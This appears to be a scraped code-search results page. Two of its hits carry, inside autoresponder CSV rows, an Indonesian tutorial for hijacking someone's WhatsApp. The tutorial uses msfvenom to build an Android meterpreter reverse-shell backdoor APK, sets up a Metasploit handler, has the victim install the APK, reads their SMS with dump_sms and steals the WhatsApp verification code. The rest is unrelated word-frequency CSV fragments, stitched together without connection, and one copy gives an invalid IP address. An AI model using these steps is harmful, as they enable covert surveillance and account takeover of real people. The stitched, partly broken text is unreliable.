@@ -1,0 +1,215 @@
+
+"sadap wa","similar","Cara menyadap Whatsapp memakai TERMUX\n\nHello bro, jumpa lagi di bersama omheker. Kali ini omheker akanmembagikan tutorial Cara menyadap Whatsapp memakai TERMUX no root. Jadi postingan ini akan membahas cara yang bisa digunakan untuk melakukan sadap whatsap menggunakan termux.\n\nBanyak aplikasi cara menyadap HP di internet tetapi Pada kesempatan kali ini omheker akan menggunakan Tool Metasploit yang ada pada TERMUX. Tool ini bisa kita manfaatkan untuk mendapatkan remote akses android target.\n\n\nJadi secara singkat, yang akan kami bagikan pada postingan ini adalah menginstal tool Metasploit di termux dan melakukan sadap wa menggunakan Metasploit. Berikut tutorial lengkap nya.\n\nSadap wa menggunakan Metasploit di Termux\n\nBagi yang belum punya aplikasi termux silahkan download dulu diplaystore untuk versi lama. Dan untuk versi terbarunya bisa kalian download termux versi lama \n\n\noke Langsung saja ke tutorialnya. Silahkan ikuti langkah-langkah berikut ini:\n\nLangkah 1: install Metasploit framework di Termux\n\nCara install Metasploit sangat mudah. tetapi size ukuran dari file Metasploit lumayan cukup besar yaitu sekitar 560mb. Sehingga kalian harus siapkan ruang penyimpanan dan kuota yang banyak.\n\n\nUntuk melakukan instalasi Metasploit framework anda bisa menggunakan command perintah berikut di aplikasi termux.\n\n apt update && apt upgrade\n\n pkg install unstable-repo\n\n pkg install metasploit\n\n\nSetelah tool Metasploit berhasil diinstal. Silahkan lanjutkan ke langkah 2.\n\nLangkah 2: MemBuat aplikasi menyadap ( membuat backdoor )\n\nDan Untuk membuat backdoor atau aplikasi sadap whatsapp anda harus menjalankan tool Metasploit nya. Gunakan command perintah berikut ini.\n\n msfconsole\n\nTunggu sampai tampilan nya berubah seperti gambar dibawah ini.\n\n\n\n\n\nSelanjutnya masukkan command berikut dan perhatian penjelasan nya agar tidak terjadi error.\n\nmsfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.101  LPORT=8080 -o /sdcard/tracker.apk\n\n# LHOST adalah IP address kalian. dan untuk Cara mengecek ip address masuk saja di setting / pengaturan lalu kemdian anda pilih tentang ponsel dan cari lagi menu status.\n\n\n\n\n\nJika android kalian tidak support, Silahakan pelajari trik lainya di halaman cara cek ip address.\n\n# LPORT kalian isi saja 8080\n\n# /sdcard/tracker.apk adalah tempat simpan dan nama file (backdoor). Kalian bisa ganti nama file sesuai keinginan. Tapi untuk tempat simpan nya sebaiknya tetap.\n\n\n\nTunggu sampai proses pembuatan aplikasi backdoor nya selesai. Biasanya memakan waktu 3-5 menit.\n\nSetelah semuanya selesai, Langkah selanjutnya anda pergi ke file manager kemudan cari file/aplikasi backdoor sesuai nama yang kalian berikan tadi. lalu kirimkan aplikasi tersebut ke target sadap wa kalian.\n\n\n\n\n\nLangkah 3: Proses penyadapan\n\nSetelah aplikasi backdoor nya dikirimkan. Pastikan korban juga harus menginstal aplikasi tersebut.\n\nLangkah Selanjutnya anda scan/cek apakah aplikasi sudah di install apa belum dengan menggunakan command berikut:\n\n. use multi/handler\n. set payload android/meterpreter/reverse_tcp\n. set lhost 192.168.1.101\n. set lport 4444\n. exploit\n\nMaka hasilnya akan seperti gambar dibawah ini.\n\n\n\n\n\nSetelah itu kalian Tunggu sampai ketika aplikasi backdoor terhubung dengan IP address kamu. Apabila pada tahap ini berlangsung sangat lama. Suruh korban untuk mengklik aplikasi yang sudah diinstall tadi.\n\nDan jika hasilnya sudah menunjukkan seperti gambar diatas. Kita ketikan saja\n\ndump_sms\n\nMaka semua pesan masuk korban akan bisa terbaca oleh kita. Dengan demikian untuk mendapatkan kode verifikasi dari whatsapp sangat lah mudah.\n\nHal terakhir kita hanya perlu melakukan pendaftaran ulang whatsapp menggunakan nomor korban. Dan pada saat harus memasukkan kode konfirmasi kita tinggal ulangi saja semua langkah 3: proses penyadapan\n\nUntuk lebih jelasnya, simak saja video tutorialnya dibawah ini:","single","","","b","","","","","0","","","","","","","","seconds","0","0"
+ CSV
+Showing the top two matches
+Last indexed 10 days ago
+@reyspeed
+reyspeed/data
+AutoResponder_WA_Rules_1604599011.csv
+"sadap wa","similar","Cara menyadap Whatsapp memakai TERMUX\n\nHello bro, jumpa lagi di bersama omheker. Kali ini omheker akanmembagikan tutorial Cara menyadap Whatsapp memakai TERMUX no root. Jadi postingan ini akan membahas cara yang bisa digunakan untuk melakukan sadap whatsap menggunakan termux.\n\nBanyak aplikasi cara menyadap HP di internet tetapi Pada kesempatan kali ini omheker akan menggunakan Tool Metasploit yang ada pada TERMUX. Tool ini bisa kita manfaatkan untuk mendapatkan remote akses android target.\n\n\nJadi secara singkat, yang akan kami bagikan pada postingan ini adalah menginstal tool Metasploit di termux dan melakukan sadap wa menggunakan Metasploit. Berikut tutorial lengkap nya.\n\nSadap wa menggunakan Metasploit di Termux\n\nBagi yang belum punya aplikasi termux silahkan download dulu diplaystore untuk versi lama. Dan untuk versi terbarunya bisa kalian download termux versi lama \n\n\noke Langsung saja ke tutorialnya. Silahkan ikuti langkah-langkah berikut ini:\n\nLangkah 1: install Metasploit framework di Termux\n\nCara install Metasploit sangat mudah. tetapi size ukuran dari file Metasploit lumayan cukup besar yaitu sekitar 560mb. Sehingga kalian harus siapkan ruang penyimpanan dan kuota yang banyak.\n\n\nUntuk melakukan instalasi Metasploit framework anda bisa menggunakan command perintah berikut di aplikasi termux.\n\n apt update && apt upgrade\n\n pkg install unstable-repo\n\n pkg install metasploit\n\n\nSetelah tool Metasploit berhasil diinstal. Silahkan lanjutkan ke langkah 2.\n\nLangkah 2: MemBuat aplikasi menyadap ( membuat backdoor )\n\nDan Untuk membuat backdoor atau aplikasi sadap whatsapp anda harus menjalankan tool Metasploit nya. Gunakan command perintah berikut ini.\n\n msfconsole\n\nTunggu sampai tampilan nya berubah seperti gambar dibawah ini.\n\n\n\n\n\nSelanjutnya masukkan command berikut dan perhatian penjelasan nya agar tidak terjadi error.\n\nmsfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100.7  LPORT=8080 -o /sdcard/tracker.apk\n\n# LHOST adalah IP address kalian. dan untuk Cara mengecek ip address masuk saja di setting / pengaturan lalu kemdian anda pilih tentang ponsel dan cari lagi menu status.\n\n\n\n\n\nJika android kalian tidak support, Silahakan pelajari trik lainya di halaman cara cek ip address.\n\n# LPORT kalian isi saja 8080\n\n# /sdcard/tracker.apk adalah tempat simpan dan nama file (backdoor). Kalian bisa ganti nama file sesuai keinginan. Tapi untuk tempat simpan nya sebaiknya tetap.\n\n\n\nTunggu sampai proses pembuatan aplikasi backdoor nya selesai. Biasanya memakan waktu 3-5 menit.\n\nSetelah semuanya selesai, Langkah selanjutnya anda pergi ke file manager kemudan cari file/aplikasi backdoor sesuai nama yang kalian berikan tadi. lalu kirimkan aplikasi tersebut ke target sadap wa kalian.\n\n\n\n\n\nLangkah 3: Proses penyadapan\n\nSetelah aplikasi backdoor nya dikirimkan. Pastikan korban juga harus menginstal aplikasi tersebut.\n\nLangkah Selanjutnya anda scan/cek apakah aplikasi sudah di install apa belum dengan menggunakan command berikut:\n\n. use multi/handler\n. set payload android/meterpreter/reverse_tcp\n. set lhost 192.168.1.100.7\n. set lport 8080\n. exploit\n\nMaka hasilnya akan seperti gambar dibawah ini.\n\n\n\n\n\nSetelah itu kalian Tunggu sampai ketika aplikasi backdoor terhubung dengan IP address kamu. Apabila pada tahap ini berlangsung sangat lama. Suruh korban untuk mengklik aplikasi yang sudah diinstall tadi.\n\nDan jika hasilnya sudah menunjukkan seperti gambar diatas. Kita ketikan saja\n\ndump_sms\n\nMaka semua pesan masuk korban akan bisa terbaca oleh kita. Dengan demikian untuk mendapatkan kode verifikasi dari whatsapp sangat lah mudah.\n\nHal terakhir kita hanya perlu melakukan pendaftaran ulang whatsapp menggunakan nomor korban. Dan pada saat harus memasukkan kode konfirmasi kita tinggal ulangi saja semua langkah 3: proses penyadapan\n\nUntuk lebih jelasnya, simak saja video tutorialnya dibawah ini:","single","","","b","","","","","0","","","","","","","","seconds","0","0"
+ CSV
+Showing the top two matches
+Last indexed 10 days ago
+@arif473
+Arv/nohoax-news-detection-using-tfidf
+Dataset/dataset fix/data arff/lemma/information gain/ig_result_0.01.csv
+ kandung ,0.086336836,
+ broadcast ,0.085854881,
+ lansir ,0.081790427,
+ whatsapp ,0.080129159,
+ resah ,0.080112648,
+ viral ,0.079545661,
+ sembako ,0,
+ pinontoan ,0,
+ otp ,0,
+ properti ,0,
+ passport ,0,
+ alas ,0,
+ nugroho ,0,
+ lambung ,0,
+ vario ,0,
+ CSV
+Showing the top two matches
+Last indexed on 15 November 2020
+@arif473
+Arif-lativ/parola
+public/csv/distinct_terms.csv
+,spontan,diviralkan,hidayatullah,<span class='text-bold bg-yellow-light rounded-1 d-inline-block'>whatsapp</span>,dorong,ahok,kagum,sosok,lengos,interograsi,rizieq,jubah,sorban
+ CSV
+Showing the top match
+Last indexed on 15 November 2020
+@lativ
+Arif-lativ/parola
+public/csv/terms_per_c/1.csv
+sukmana,0
+surabaya,1
+alamat,8
+wonokromo,0
+kode,1
+pos,3
+tetangga,0
+thj,0
+revanda,0
+eka,0
+cantika,0
+toic,0
+tqxck,0
+kasad,0
+handphonenya,0
+fpi,0
+gerebek,0
+interogasi,0
+spontan,0
+diviralkan,0
+hidayatullah,0
+whatsapp,0
+dorong,0
+ CSV
+Showing the top two matches
+Last indexed on 15 November 2020
+@arif473
+Arif-lativ/parola
+public/csv/terms_per_c/10.csv
+bicara,0
+kevin,0
+riski,1
+permana,0
+stupun,0
+prima,0
+pandu,0
+sukmana,0
+surabaya,2
+alamat,6
+wonokromo,0
+kode,0
+gerebek,0
+interogasi,0
+spontan,0
+diviralkan,0
+hidayatullah,0
+whatsapp,0
+dorong,0
+ahok,0
+kagum,0
+sosok,0
+lengos,0
+ CSV
+Showing the top two matches
+Last indexed on 15 November 2020
+@arif473
+Arif-lativ/parola
+public/csv/terms_per_c/2.csv
+sukmana,1
+surabaya,4
+alamat,3
+wonokromo,1
+kode,4
+pos,1
+tetangga,1
+thj,1
+revanda,1
+eka,1
+cantika,1
+toic,1
+kasad,0
+handphonenya,0
+fpi,0
+gerebek,0
+interogasi,0
+spontan,0
+diviralkan,0
+hidayatullah,0
+whatsapp,0
+dorong,0
+ CSV
+Showing the top two matches
+Last indexed on 19 Jul 2018
+@arif473
+Arif-lativ/parola
+public/csv/terms_per_c/3.csv
+alamat,3
+wonokromo,0
+kode,0
+pos,3
+tetangga,0
+thj,0
+revanda,0
+eka,0
+cantika,0
+toic,0
+tqxck,0
+pengang,0
+rnykx,0
+tpqao,0
+fpi,0
+gerebek,0
+interogasi,0
+spontan,0
+diviralkan,0
+hidayatullah,0
+whatsapp,0
+dorong,0
+ahok,0
+kagum,0
+ CSV
+Showing the top two matches
+Last indexed on 19 Jul 2018
+@arif473
+Arif-lativ/parola
+public/csv/terms_per_c/4.csv
+alamat,8
+wonokromo,0
+kode,2
+pos,2
+tetangga,0
+thj,0
+revanda,0
+eka,0
+cantika,0
+toic,0
+tqxck,0
+pengang,0
+rnykx,0
+kasad,0
+handphonenya,0
+fpi,0
+gerebek,0
+interogasi,0
+spontan,0
+diviralkan,0
+hidayatullah,0
+whatsapp,0
+dorong,0
+ CSV
+Showing the top two matches
+Last indexed on 15 November 2020
+@arif473
+Arif-lativ/parola
+public/csv/terms_per_c/5.csv
+wonokromo,0
+kode,1
+pos,2
+tetangga,0
+thj,0
+revanda,0
+eka,0
+cantika,0
+toic,0
+tqxck,0
+pengang,0
+rnykx,0
+tpqao,0
+handphonenya,0
+fpi,0
+gerebek,0
+interogasi,0
+spontan,0
+diviralkan,0
+hidayatullah,0
+whatsapp,0
+dorong,0
+ahok,0
+kagum,0
+ CSV
+Showing the top two matches
+Last indexed on 15 November 2020
